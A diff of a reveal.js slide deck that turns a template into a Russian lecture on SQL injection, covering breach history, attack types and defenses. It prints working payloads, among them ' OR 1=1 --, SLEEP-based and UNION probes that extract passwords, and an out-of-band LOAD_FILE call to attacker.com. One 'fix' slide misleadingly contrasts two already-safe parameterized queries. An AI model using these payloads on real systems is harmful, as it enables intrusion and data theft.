@@ -23,189 +23,311 @@
         <div class="reveal">
             <div class="slides">
                 <section>
-                    <h1>Beautiful presentations</h1>
-                    <h2>New features</h2>
-                    <ul>
-                        <li>Nerd icons </li>
-                        <li>
-                            <code class="js">
-                                (inline) => code("highlighting")
-                            </code>
-                        </li>
-                        <li>Automatic QR Code generation</li>
-                        <li>and much more!</li>
-                    </ul>
-                </section>
-                <section>
-                    <h1>CUSTOM TOKYONIGHT THEME</h1>
-                    <h2 class="fragment">THAT HAS</h2>
-                    <h3 class="fragment">MULTI</h3>
-                    <h4 class="fragment">LEVEL</h4>
-                    <h5 class="fragment">HEADING</h5>
-                    <h6 class="fragment">COLORS</h6>
-                    <h6>
-                        Thanks to this project
-                        <a
-                            href="https://github.com/tcmmichaelb139/obsidian-tokyonight">
-                            
-                        </a>
-                        for the colorscheme!
-                    </h6>
-                </section>
-                <section>
-                    <section>
-                        <h1>Tailwind CSS</h1>
-                        <div class="grid grid-cols-2 gap-8">
-                            <div>
-                                <h5>Lorem, ipsum.</h5>
-                                <p>
-                                    Lorem ipsum dolor sit amet consectetur
-                                    adipisicing elit. Error quod fugiat harum
-                                    modi laboriosam dignissimos, maxime
-                                    possimus? Error, nihil in.
-                                </p>
-                            </div>
-                            <div>
-                                <h5>Lorem, ipsum.</h5>
-                                <p>
-                                    Lorem ipsum dolor sit amet consectetur
-                                    adipisicing elit. Error quod fugiat harum
-                                    modi laboriosam dignissimos, maxime
-                                    possimus? Error, nihil in.
-                                </p>
-                            </div>
-                            <div class="col-span-2">
-                                <h5>Lorem, ipsum.</h5>
-                                <p>
-                                    Lorem ipsum dolor sit amet consectetur
-                                    adipisicing elit. Error quod fugiat harum
-                                    modi laboriosam dignissimos, maxime
-                                    possimus? Error, nihil in.
-                                </p>
-                            </div>
-                        </div>
-                    </section>
-                    <section>
-                        <h1>Custom classes</h1>
-                        <div class="grid grid-cols-3 gap-8">
-                            <div class="border-r">
-                                <h5>border-r</h5>
-                                <p>
-                                    Lorem ipsum dolor sit amet, consectetur
-                                    adipisicing elit. Illum, soluta!
-                                </p>
-                            </div>
-                            <div class="border-o">
-                                <h5>border-o</h5>
-                                <p>
-                                    Lorem ipsum dolor sit amet, consectetur
-                                    adipisicing elit. Illum, soluta!
-                                </p>
-                            </div>
-                            <div class="border-y">
-                                <h5>border-y</h5>
-                                <p>
-                                    Lorem ipsum dolor sit amet, consectetur
-                                    adipisicing elit. Illum, soluta!
-                                </p>
-                            </div>
-                        </div>
-                    </section>
-                </section>
-                <section>
-                    <section data-auto-animate>
-                        <h1>New code highlighting!</h1>
-                        <div>
-                            Now also has Tokyo Night
-                            <code>highlight.js</code>
-                            highlighting implementation
-                        </div>
-                        <pre><code data-trim data-noescape>
-var foo = {
-    bar: function () {
-             alert("Hello, World!");
-         }
-};	
-					</code></pre>
-                    </section>
-                    <section data-auto-animate>
-                        <h1>New code highlighting!</h1>
-                        <h5>Inline code highlighting is now also supported!</h5>
-                        <p>
-                            Just wrap your code with
-                            <code>&lt;code&gt;</code>
-                            tag and get highlighting like this
-                            <code class="js">
-                                const foo = () => {return bar}
-                            </code>
-                            !
-                        </p>
-                    </section>
-                </section>
-                <section>
-                    <h1>Mermaid for beautiful diagrams!</h1>
-                    <div class="mermaid">
-                        <pre>
-						erDiagram
-    CUSTOMER ||--o{ ORDER : ""
-    CUSTOMER {
-        string name
-        string custNumber
-        string sector
-    }
-    ORDER ||--|{ LINE-ITEM : contains
-    ORDER {
-        int orderNumber
-        string deliveryAddress
-    }
-    LINE-ITEM {
-        string productCode
-        int quantity
-        float pricePerUnit
-    }
-    ORDER ||--|{ STUDENT : contains
-    STUDENT {
-        int orderNumber
-        string deliveryAddress
-    }
-						</pre
-                        >
-                    </div>
-                    <h4>
-                        Check documentation
-                        <a href="https://mermaid.js.org/config/usage.html">
-                            here
-                        </a>
-                        !
-                    </h4>
-                </section>
-                <section>
-                    <h1>Now supports Nerd font icons!</h1>
-                    <div>Nerdy project that adds icons to font itself</div>
-                    <h6>
-                        Checkout their site for icons like this
-                        <a href="https://www.nerdfonts.com/">󰖟</a>
-                        !
-                    </h6>
-                </section>
-                <section>
-                    <h1>Now supports automatic QRCode generation!</h1>
-                    <div>
-                        With GoQR you can just add data-type and alt attributes
-                        to your
-                        <code class="html">
-                            &lt;img src="https://goqr.me/" data-type="qrcode" /
-                            &gt;
-                        </code>
-                        tag!
-                    </div>
+                    <h1>SQL-injection</h1>
                     <img
                         class="r-stretch"
-                        src="https://goqr.me/"
+                        src="https://ktkv-presentations.github.io/websec-6"
                         data-type="qrcode" />
                 </section>
                 <section>
-                    <h1>New changes on the way!</h1>
+                    <section>
+                        <h1>SQL-инъекция</h1>
+                        <h3>SQL Injection (SQLi)</h3>
+                        <p>
+                            внедрении вредоносного SQL-кода в запрос к базе
+                            данных с целью получения несанкционированного
+                            доступа к данным, их изменения или удаления
+                        </p>
+                        <pre><code data-trim class="python">
+user_input = input("Введите имя пользователя: ")  
+query = f"SELECT * FROM users WHERE username = '{user_input}'"  
+                        </code></pre>
+                        <h4>
+                            если ввести
+                            <code>admin' --</code>
+                            , то это приведет к следующему коду
+                        </h4>
+                        <pre><code data-trim data-line-numbers class="sql">
+SELECT * FROM users WHERE username = 'admin' --'
+                        </code></pre>
+                    </section>
+                    <section>
+                        <h1>Исторический контекст и значимость уязвимости</h1>
+                        <p>
+                            SQL-инъекции известны с 1998 года и остаются
+                            критической угрозой. Многие компании и организации
+                            пострадали от атак, связанных с SQL-инъекциями, что
+                            привело к утечкам данных миллионов пользователей
+                        </p>
+                        <ul>
+                            <li>
+                                Heartland Payment Systems (2008) — кража данных
+                                130 млн кредитных карт.
+                            </li>
+                            <li>
+                                Sony PlayStation Network (2011) — утечка данных
+                                77 млн пользователей.
+                            </li>
+                            <li>
+                                British Airways (2018) — кража данных 380 тыс.
+                                клиентов.
+                            </li>
+                        </ul>
+                    </section>
+                    <section>
+                        <h1>Цели атаки</h1>
+                        <ul>
+                            <li>
+                                Кража конфиденциальных данных (логины, пароли,
+                                номера карт, персональные данные).
+                            </li>
+                            <li>
+                                Изменение или удаление информации (например,
+                                подмена цен в интернет-магазине).
+                            </li>
+                            <li>
+                                Компрометация системы (получение контроля над
+                                сервером, удалённый запуск команд).
+                            </li>
+                            <li>
+                                Распространение вредоносного ПО (инъекции могут
+                                использоваться для внедрения вредоносных
+                                скриптов).
+                            </li>
+                        </ul>
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h1>Пример SQL-payload</h1>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <td>id</td>
+                                    <td>username</td>
+                                    <td>password</td>
+                                    <td>role</td>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>1</td>
+                                    <td>admin</td>
+                                    <td>12345</td>
+                                    <td>admin</td>
+                                </tr>
+                                <tr>
+                                    <td>2</td>
+                                    <td>user1</td>
+                                    <td>pass123</td>
+                                    <td>user</td>
+                                </tr>
+                                <tr>
+                                    <td>3</td>
+                                    <td>user2</td>
+                                    <td>qwerty</td>
+                                    <td>user</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h4>Шаблон запроса</h4>
+                        <pre><code data-trim class="sql">
+SELECT * FROM users WHERE username = 'admin';
+                        </code></pre>
+                        <h5>Пейлоад</h5>
+                        <pre><code data-trim class="sql">
+' OR 1=1 --
+                        </code></pre>
+                        <h6>Конечный запрос</h6>
+                        <pre><code data-trim class="sql">
+SELECT * FROM users WHERE username = '' OR 1=1 --';
+                        </code></pre>
+                    </section>
+                    <section>
+                        <h1>Варианты борьбы</h1>
+                        <h4>Вместо</h4>
+                        <pre><code data-trim class="python">
+cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+                        </code></pre>
+                        <h5>Использовать</h5>
+                        <pre><code data-trim class="python">
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+                        </code></pre>
+                    </section>
+                    <section>
+                        <h1>Где встречаются SQL уязвимости</h1>
+                        <ul>
+                            <li>Формы ввода (логин, регистрация, поиск)</li>
+                            <li>URL-параметры (/profile?id=1)</li>
+                            <li>
+                                Cookies (например, user_id=1, который можно
+                                изменить)
+                            </li>
+                            <li>
+                                HTTP-заголовки (например, Referer, User-Agent)
+                            </li>
+                            <li>
+                                API-запросы (например, REST или GraphQL с
+                                некорректной обработкой данных)
+                            </li>
+                        </ul>
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h1>Виды SQL инъекций</h1>
+                        <h3>Прямые (классические) SQL-инъекции</h3>
+                        <p>
+                            злоумышленник вводит SQL-код в форму ввода, изменяя
+                            поведение запроса
+                        </p>
+                        <h4>Пейлоад</h4>
+                        <pre><code data-trim class="sql">
+                        ' OR 1=1 --
+                        </code></pre>
+                        <h5>Конечный запрос</h5>
+                        <pre><code data-trim class="sql">
+SELECT * FROM users WHERE username = '' OR 1=1 --'
+                        </code></pre>
+                        <i>
+                            Условие 1=1 всегда истинно, что приводит к выдаче
+                            всех записей
+                        </i>
+                    </section>
+                    <section>
+                        <h1>Виды SQL инъекций</h1>
+                        <h3>Слепые (Blind SQL) инъекции</h3>
+                        <p>
+                            когда сервер не возвращает ошибки SQL, но позволяет
+                            определить наличие уязвимости по поведению
+                        </p>
+                        <h4>Boolean-based (логическая слепая инъекция)</h4>
+                        <pre><code data-trim class="sql">
+' OR 1=1 --  
+' OR 1=0 --  
+                        </code></pre>
+                        <i>
+                            Если при 1=1 сервер выдаёт результат, а при 1=0 —
+                            нет, значит, SQL-инъекция возможна
+                        </i>
+                        <h4>Time-based (основанная на времени)</h4>
+                        <p>
+                            Используется, если сервер не выдаёт ошибки, но
+                            позволяет замедлить выполнение запроса
+                        </p>
+                        <pre><code data-trim class="sql">
+' OR IF(1=1, SLEEP(5), 0) --  
+                        </code></pre>
+                        <p>
+                            Если сервер зависает на 5 секунд, значит, инъекция
+                            работает
+                        </p>
+                    </section>
+                    <section>
+                        <h1>Виды SQL инъекций</h1>
+                        <h4>Error-based (ошибочная SQL-инъекция)</h4>
+                        <p>
+                            вызывает SQL-ошибки, чтобы получить структуру базы
+                            данных
+                        </p>
+                        <h4></h4>
+                        <pre><code data-trim class="sql">
+' AND (SELECT 1 FROM users WHERE id=1) = 1 --
+                        </code></pre>
+                        <p>
+                            Если сервер выдаёт ошибку, значит, таблица users
+                            существует
+                        </p>
+                        <h4>UNION-based (через объединение запросов)</h4>
+                        <p>
+                            Используется для получения данных из других таблиц с
+                            помощью UNION
+                        </p>
+                        <pre><code data-trim class="sql">
+' ORDER BY 3 --
+                        </code></pre>
+                        <p>
+                            Если сервер выдаёт ошибку, значит, столбцов меньше 3
+                        </p>
+                        <pre><code data-trim class="sql">
+' UNION SELECT username, password FROM users --
+                        </code></pre>
+                    </section>
+                    <section>
+                        <h1>Виды SQL инъекций</h1>
+                        <h4>Out-of-Band (внеполосные атаки)</h4>
+                        <p>
+                            Используется, когда другие методы не работают, но
+                            база позволяет делать внешние запросы
+                        </p>
+                        <pre><code data-trim class="sql">
+' UNION SELECT LOAD_FILE('\\\\attacker.com\\payload') --
+                        </code></pre>
+                        <i>
+                            отправляет запрос на attacker.com, передавая данные
+                        </i>
+                    </section>
+                    <section>
+                        <h1>Автоматизация SQL атак</h1>
+                        <ul>
+                            <li>
+                                SQLMap – анализирует сайт и выполняет
+                                SQL-инъекции.
+                            </li>
+                            <li>
+                                Burp Suite – перехват и изменение HTTP-запросов.
+                            </li>
+                            <li>
+                                Nmap + NSE-скрипты – сканирование
+                                веб-приложений.
+                            </li>
+                            <li>
+                                Wfuzz и DirBuster – поиск скрытых директорий и
+                                параметров.
+                            </li>
+                        </ul>
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h1>Методы защиты от SQL-инъекций</h1>
+                        <h4>Использование параметризованных запросов</h4>
+                        <p>
+                            SQL-запрос, в котором данные передаются отдельно от
+                            кода, предотвращая внедрение вредоносных SQL-команд
+                        </p>
+                        <pre><code data-trim class="python">
+cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+                        </code></pre>
+                        <h5>вместо</h5>
+                        <pre><code data-trim class="sql">
+query = f"SELECT * FROM users WHERE username = '{username}'"
+                        </code></pre>
+                        <h4>Использование ORM (Object-Relational Mapping)</h4>
+                        <p>
+                            ORM автоматически создаёт безопасные SQL-запросы,
+                            исключая ручное написание SQL-кода
+                        </p>
+                        <pre><code data-trim class="python">
+User.objects.filter(username=username)
+                        </code></pre>
+                    </section>
+                    <section>
+                        <h1>Методы защиты от SQL-инъекций</h1>
+                        <h4>Ограничение привилегий базы данных</h4>
+                        <p>Чтобы минимизировать ущерб в случае атаки, следует ограничивать права пользователя базы данных</p>
+                        <pre><code data-trim class="sql">
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'secure_password';
+GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_user'@'localhost';
+                        </code></pre>
+                        <h4>Валидация и очистка пользовательского ввода</h4>
+                        <p>Фильтрация нежелательных символов</p>
+                        <pre><code data-trim class="python">
+import re
+if not re.match("^[a-zA-Z0-9_]+$", username):
+    raise ValueError("Недопустимый ввод")
+                        </code></pre>
+                    </section>
                 </section>
             </div>
         </div>
@@ -396,4 +518,3 @@ var foo = {
         </script>
     </body>
 </html>
-
